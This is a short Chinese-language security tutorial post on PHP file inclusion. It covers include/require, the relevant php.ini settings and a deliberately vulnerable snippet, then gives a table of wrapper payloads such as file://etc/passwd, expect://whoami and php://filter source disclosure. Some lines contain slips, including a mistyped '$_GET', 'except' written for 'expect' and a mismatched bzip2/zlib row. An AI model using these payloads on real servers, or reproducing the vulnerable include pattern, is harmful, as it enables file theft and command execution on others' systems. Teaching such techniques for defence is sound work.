---
title: 文件包含
date: 2026-03-30T14:00:00+08:00
draft: false
toc: true
images:
tags:
  - Hack
---
## 存在漏洞的函数

### Include

只有代码执行到此才函数将文件包含起来，报错仅警告，但会继续执行。

### Require

只要程序运行立刻调用此函数包含文件，发生错误时输出错误信息并终止执行。

### Include_once

只调用一次。

### Require_once

只调用一次。

### 调用的条件

在 `php.ini` 中开启 `allow_url_include` ，如需远程包含还需开启 `allow_url_fopen`。

下面是一个存在包含的源码。

```php
<?php
$enil = @_$GET['file'];
include $enil;
?>
```

## PHP 伪协议


| 协议                | 用法         | 语法                                                            |
| ----------------- | ---------- | ------------------------------------------------------------- |
| file://           | 访问本地文件系统   | ?enil=file://etc/passwd                                       |
| ftp://            | 访问 ftp url | ?enil=ftp://enil@enil.com/README.md                           |
| http://           | 访问 http    | ?enil=http://enilmalus.github.io                              |
| data://           | 数据         | ?enil=data://text/plain,hello                                 |
| ssh2://           | ssh        | ?enil=ssh2.sftp://enil@enil.com/README.md                     |
| except://         | 处理交互式流     | ?enil=expect://whoami                                         |
| php://filter      | 输入输出       | ?enil=php://filter/convert.base64-encode/resource=./index.php |
| compress.bzip2:// | 压缩流        | ?enil=compress.zlib://C:/phpStudy/PHPTutorial/WWW/file.bz2    |

### php://filter

`php:filter/convert.base64-encode/resource=master.php`  是一个特殊的 URL 语法，用于在访问文件时对文件内容进行 `base64` 编码。